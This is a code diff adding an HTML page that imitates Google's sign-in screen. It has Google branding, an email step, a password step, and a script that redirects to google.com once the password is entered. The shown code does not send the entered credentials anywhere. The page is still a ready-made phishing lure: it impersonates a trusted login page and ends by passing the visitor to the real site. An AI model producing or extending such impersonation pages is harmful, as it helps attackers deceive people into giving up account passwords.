@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Google – Sign in</title>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: #fff;
+      color: #202124;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header { padding: 16px 24px; }
+
+    .header-logo { display: flex; align-items: center; text-decoration: none; }
+    .logo-img { height: 28px; width: auto; }
+
+    main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .card {
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      padding: 48px 40px 36px;
+      width: 100%;
+      max-width: 450px;
+      text-align: center;
+    }
+
+    .card-logo-img {
+      height: 40px;
+      width: auto;
+      margin-bottom: 20px;
+    }
+
+    .card h1 {
+      font-family: 'Google Sans', 'Roboto', sans-serif;
+      font-size: 24px;
+      font-weight: 400;
+      color: #202124;
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      color: #202124;
+      margin-bottom: 32px;
+      line-height: 1.5;
+    }
+
+    /* email chip */
+    .email-chip {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      border: 1px solid #dadce0;
+      border-radius: 20px;
+      padding: 6px 14px 6px 8px;
+      margin: 0 auto 28px;
+      width: fit-content;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .email-chip:hover { background: #f1f3f4; }
+    .avatar {
+      width: 28px; height: 28px;
+      border-radius: 50%;
+      background: #1a73e8;
+      color: #fff;
+      font-size: 13px;
+      font-weight: 500;
+      display: flex; align-items: center; justify-content: center;
+      font-family: 'Google Sans', sans-serif;
+    }
+    .chip-email { font-size: 14px; color: #202124; }
+    .chip-arrow { width: 18px; height: 18px; color: #5f6368; }
+
+    /* screens */
+    #screen-email  { display: block; }
+    #screen-password { display: none; }
+
+    /* inputs */
+    .input-group {
+      position: relative;
+      margin-bottom: 24px;
+      text-align: left;
+    }
+    .input-group input {
+      width: 100%;
+      height: 56px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      padding: 16px 16px 0;
+      font-size: 16px;
+      font-family: 'Roboto', sans-serif;
+      color: #202124;
+      background: transparent;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .input-group input:focus { border-color: #1a73e8; border-width: 2px; }
+    .input-group input:focus + label,
+    .input-group input:not(:placeholder-shown) + label {
+      top: 8px; font-size: 12px; color: #1a73e8;
+    }
+    .input-group label {
+      position: absolute;
+      left: 16px; top: 18px;
+      font-size: 16px; color: #5f6368;
+      pointer-events: none;
+      transition: all 0.15s ease;
+      background: #fff;
+      padding: 0 4px;
+    }
+
+    .pw-toggle {
+      display: flex; align-items: center; gap: 8px;
+      text-align: left;
+      margin-top: -12px; margin-bottom: 24px;
+    }
+    .pw-toggle input[type=checkbox] { cursor: pointer; }
+    .pw-toggle label { font-size: 14px; color: #202124; cursor: pointer; }
+
+    .forgot { text-align: left; margin-top: -14px; margin-bottom: 28px; }
+    .forgot a { font-size: 14px; color: #1a73e8; text-decoration: none; font-family: 'Google Sans', sans-serif; }
+    .forgot a:hover { text-decoration: underline; }
+
+    .info-text {
+      font-size: 14px; color: #5f6368;
+      text-align: left; margin-bottom: 28px; line-height: 1.5;
+    }
+    .info-text a { color: #1a73e8; text-decoration: none; }
+    .info-text a:hover { text-decoration: underline; }
+
+    .buttons {
+      display: flex; justify-content: space-between; align-items: center;
+      margin-top: 8px;
+    }
+    .btn-create {
+      font-family: 'Google Sans', sans-serif;
+      font-size: 14px; font-weight: 500;
+      color: #1a73e8; background: none; border: none;
+      cursor: pointer; padding: 10px 0; text-decoration: none;
+    }
+    .btn-create:hover { text-decoration: underline; }
+    .btn-next {
+      font-family: 'Google Sans', sans-serif;
+      font-size: 14px; font-weight: 500;
+      color: #fff; background: #1a73e8;
+      border: none; border-radius: 4px;
+      padding: 10px 24px; cursor: pointer;
+      transition: background 0.2s, box-shadow 0.2s;
+    }
+    .btn-next:hover { background: #1765cc; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
+
+    .divider { height: 1px; background: #e0e0e0; margin: 24px -40px 0; }
+
+    .card-footer {
+      display: flex; justify-content: space-between; align-items: center;
+      padding-top: 20px; flex-wrap: wrap; gap: 8px;
+    }
+    .lang-select {
+      display: flex; align-items: center; gap: 6px;
+      font-size: 14px; color: #5f6368;
+      cursor: pointer; border: none; background: none;
+      font-family: 'Roboto', sans-serif;
+    }
+    .footer-links { display: flex; gap: 16px; }
+    .footer-links a { font-size: 14px; color: #5f6368; text-decoration: none; }
+    .footer-links a:hover { text-decoration: underline; }
+
+    footer {
+      background: #f1f3f4;
+      border-top: 1px solid #e0e0e0;
+      padding: 14px 24px;
+      display: flex; justify-content: space-between; align-items: center;
+      flex-wrap: wrap; gap: 12px;
+    }
+    footer span { font-size: 14px; color: #5f6368; }
+    .footer-nav { display: flex; gap: 20px; }
+    .footer-nav a { font-size: 14px; color: #5f6368; text-decoration: none; }
+    .footer-nav a:hover { text-decoration: underline; }
+
+    /* slide animations */
+    .slide-out-left { animation: slideOutLeft 0.25s ease forwards; }
+    .slide-in-right  { animation: slideInRight 0.25s ease forwards; }
+    @keyframes slideOutLeft {
+      from { opacity:1; transform:translateX(0); }
+      to   { opacity:0; transform:translateX(-30px); }
+    }
+    @keyframes slideInRight {
+      from { opacity:0; transform:translateX(30px); }
+      to   { opacity:1; transform:translateX(0); }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <a class="header-logo" href="#">
+      <img class="logo-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTjE3IbOFclX4cyMokQsgu7hDSn6iAHG83ZTw&s" alt="Google Logo" />
+    </a>
+  </header>
+
+  <main>
+    <div class="card">
+
+      <img class="card-logo-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTjE3IbOFclX4cyMokQsgu7hDSn6iAHG83ZTw&s" alt="Google Logo" />
+
+      <!-- ── SCREEN 1: EMAIL ── -->
+      <div id="screen-email">
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to Google</p>
+
+        <div class="input-group">
+          <input type="email" id="email" placeholder=" " autocomplete="off" />
+          <label for="email">Email or phone</label>
+        </div>
+
+        <div class="forgot">
+          <a href="#">Forgot email?</a>
+        </div>
+
+        <p class="info-text">
+          Not your computer? Use a Guest mode to sign in privately.
+          <a href="#">Learn more about using Guest mode</a>
+        </p>
+
+        <div class="buttons">
+          <a href="#" class="btn-create">Create account</a>
+          <button class="btn-next" id="btn-next-email">Next</button>
+        </div>
+      </div>
+
+      <!-- ── SCREEN 2: PASSWORD ── -->
+      <div id="screen-password">
+        <h1>Welcome</h1>
+
+        <div class="email-chip" id="email-chip">
+          <div class="avatar" id="chip-avatar">?</div>
+          <span class="chip-email" id="chip-email-text">user@gmail.com</span>
+          <svg class="chip-arrow" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M7 10l5 5 5-5z"/>
+          </svg>
+        </div>
+
+        <div class="input-group">
+          <input type="password" id="password" placeholder=" " autocomplete="off" />
+          <label for="password">Enter your password</label>
+        </div>
+
+        <div class="pw-toggle">
+          <input type="checkbox" id="show-pw" onchange="togglePw()" />
+          <label for="show-pw">Show password</label>
+        </div>
+
+        <div class="forgot">
+          <a href="#">Forgot password?</a>
+        </div>
+
+        <div class="buttons">
+          <div></div>
+          <button class="btn-next" id="btn-next-password">Next</button>
+        </div>
+      </div>
+
+      <div class="divider"></div>
+      <div class="card-footer">
+        <button class="lang-select">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+          </svg>
+          English (United States)
+        </button>
+        <div class="footer-links">
+          <a href="#">Help</a>
+          <a href="#">Privacy</a>
+          <a href="#">Terms</a>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <span>English (United States)</span>
+    <nav class="footer-nav">
+      <a href="#">Help</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+    </nav>
+  </footer>
+
+  <script>
+    const emailScreen    = document.getElementById('screen-email');
+    const passwordScreen = document.getElementById('screen-password');
+    const emailInput     = document.getElementById('email');
+
+    // ── Step 1 → Step 2 ──
+    document.getElementById('btn-next-email').addEventListener('click', goToPassword);
+    emailInput.addEventListener('keydown', e => { if (e.key === 'Enter') goToPassword(); });
+
+    function goToPassword() {
+      const val = emailInput.value.trim() || 'user@gmail.com';
+      document.getElementById('chip-email-text').textContent = val;
+      document.getElementById('chip-avatar').textContent = val.charAt(0).toUpperCase();
+
+      emailScreen.classList.add('slide-out-left');
+      setTimeout(() => {
+        emailScreen.style.display = 'none';
+        emailScreen.classList.remove('slide-out-left');
+        passwordScreen.style.display = 'block';
+        passwordScreen.classList.add('slide-in-right');
+        setTimeout(() => passwordScreen.classList.remove('slide-in-right'), 300);
+        document.getElementById('password').focus();
+      }, 250);
+    }
+
+    // ── Step 2 Next → redirect ──
+    document.getElementById('btn-next-password').addEventListener('click', doRedirect);
+    document.getElementById('password').addEventListener('keydown', e => { if (e.key === 'Enter') doRedirect(); });
+
+    function doRedirect() {
+      window.location.href = 'https://google.com';
+    }
+
+    // ── Chip → back to email ──
+    document.getElementById('email-chip').addEventListener('click', function() {
+      passwordScreen.classList.add('slide-out-left');
+      setTimeout(() => {
+        passwordScreen.style.display = 'none';
+        passwordScreen.classList.remove('slide-out-left');
+        emailScreen.style.display = 'block';
+        emailScreen.classList.add('slide-in-right');
+        setTimeout(() => emailScreen.classList.remove('slide-in-right'), 300);
+        emailInput.focus();
+      }, 250);
+    });
+
+    function togglePw() {
+      const pw = document.getElementById('password');
+      pw.type = document.getElementById('show-pw').checked ? 'text' : 'password';
+    }
+  </script>
+</body>
+</html>
